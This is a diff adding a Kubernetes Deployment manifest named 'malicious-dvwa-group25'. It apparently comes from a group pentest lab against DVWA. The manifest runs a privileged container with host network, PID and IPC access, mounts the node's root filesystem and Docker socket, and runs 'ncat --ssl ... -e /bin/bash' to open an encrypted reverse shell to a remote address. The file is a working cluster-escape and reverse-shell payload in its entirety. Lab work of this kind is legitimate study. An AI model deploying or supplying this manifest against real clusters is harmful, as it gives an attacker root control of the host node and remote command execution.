@@ -1,0 +1,71 @@
+{
+  "apiVersion": "apps/v1",
+  "kind": "Deployment",
+  "metadata": {
+    "name": "malicious-dvwa-group25",
+    "namespace": "dvwa-group25",
+    "labels": {
+      "app": "pentest",
+      "type": "deployment"
+    }
+  },
+  "spec": {
+    "replicas": 2,
+    "selector": {
+      "matchLabels": {
+        "app": "pentest",
+        "type": "deployment"
+      }
+    },
+    "template": {
+      "metadata": {
+        "labels": {
+          "app": "pentest",
+          "type": "deployment"
+        }
+      },
+      "spec": {
+        "hostNetwork": true,
+        "hostPID": true,
+        "hostIPC": true,
+        "containers": [
+          {
+            "name": "revshell-deployment",
+            "image": "raesene/ncat",
+            "command": ["/bin/sh", "-c", "--"],
+            "args": ["ncat --ssl 10.244.0.40 31337 -e /bin/bash;"],
+            "securityContext": {
+              "privileged": true
+            },
+            "volumeMounts": [
+              {
+                "mountPath": "/host",
+                "name": "noderoot"
+              },
+              {
+                "mountPath": "/var/run/docker.sock",
+                "readOnly": true,
+                "name": "docker-volume"
+              }
+            ]
+          }
+        ],
+        "volumes": [
+          {
+            "name": "noderoot",
+            "hostPath": {
+              "path": "/"
+            }
+          },
+          {
+            "name": "docker-volume",
+            "hostPath": {
+              "path": "/var/run/docker.sock"
+            }
+          }
+        ]
+      }
+    }
+  }
+}
+
